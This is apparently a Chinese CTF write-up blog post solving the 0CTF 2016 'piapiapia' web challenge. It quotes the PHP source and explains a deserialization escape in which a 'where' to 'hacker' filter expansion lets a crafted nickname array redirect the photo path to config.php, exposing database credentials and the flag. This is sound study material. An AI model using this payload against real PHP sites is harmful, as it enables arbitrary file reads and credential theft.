---
title: buuoj刷题记录1
date: 2019-12-23 19:44:18
tags: 
 - ctf
 - buuoj
 - web
 - 0CTF
---

## [0CTF 2016]piapiapia

### 0x01 基础

一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描

PHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)

<!--more-->

### 0x02 分析

题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件
config.php

```
<?php
    $config['hostname'] = '127.0.0.1';
    $config['username'] = 'root';
    $config['password'] = '';
    $config['database'] = '';
    $flag = '';
?>
```
查看index.php

```php
if($user->login($username, $password)) {
			$_SESSION['username'] = $username;
			header('Location: profile.php');//登入后跳转到profile.php
			exit;	
		}
```

查看profile.php

```PHP
<?php   
    require_once('class.php');
if($_SESSION['username'] == null) { 
    die('Login First');
}   
$username = $_SESSION['username'];
$profile=$user->show_profile($username);
if($profile  == null) { 
    header('Location: update.php'); //$profile为空，跳转到update.php
}
else { 
    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，
    $phone = $profile['phone']; 
    $email = $profile['email']; 
    $nickname = $profile['nickname'];
    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容
}
?>
```

update.php

```php
if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

    $username = $_SESSION['username'];
    if(!preg_match('/^\d{11}$/', $_POST['phone']))
        die('Invalid phone');

    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
        die('Invalid email');

if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');

    $file = $_FILES['photo'];
    if($file['size'] < 5 or $file['size'] > 1000000)
        die('Photo size error');

    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
    $profile['phone'] = $_POST['phone'];
    $profile['email'] = $_POST['email'];
    $profile['nickname'] = $_POST['nickname'];
    $profile['photo'] = 'upload/' . md5($file['name']);

    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数
    echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
}
```
查看update_profile()函数
```PHP
public function update_profile($username, $new_profile) {
    $username = parent::filter($username);
    $new_profile = parent::filter($new_profile); 
    $where = "username = '$username'"; 
    return parent::update($this->table, 'profile', $new_profile, $where);
}
```
查看filter()函数
```php
public function filter($string) {
    $escape = array('\'', '\\\\'); 
    $escape = '/' . implode('|', $escape) . '/'; 
    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\” 替换成 “_” 
    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 "hacker"，返回替换后的字符串
}
```

在update_profile()，返回到profile.php.

```php
$profile = unserialize($profile); //反序列化$profile
    $phone = $profile['phone']; 
    $email = $profile['email']; 
    $nickname = $profile['nickname'];
    $photo = base64_encode(file_get_contents($profile['photo']));

```

序列化后

```
$profile=a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:8:"12@12.12";s:8:"nickname";s:4:"1234";s:5:"photo";s:39:"upload/d41d8cd98f00b204e9800998ecf8427e";}
```
要让$photo得到的文件是config.php也就是

```
s:5:"photo";s:39:"upload/d41d8cd98f00b204e9800998ecf8427e";
```
变成 
```
s:5:"photo";s:10:"config.php";
```
序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。

因为nickname有长度限制使用数组可以绕过

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
```
让nickname的值为`"};s:5:"photo";s:10:"config.php";}`长度为34,传入34个where
### 0x03 开始操作

![1](/images/1.png) 传入参数

访问profile.php

![2](/images/2.png)

将base64解码


```php
<?php
$config['hostname'] = '127.0.0.1';
$config['username'] = 'root';
$config['password'] = 'qwertyuiop';
$config['database'] = 'challenges';
$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';
?>
```

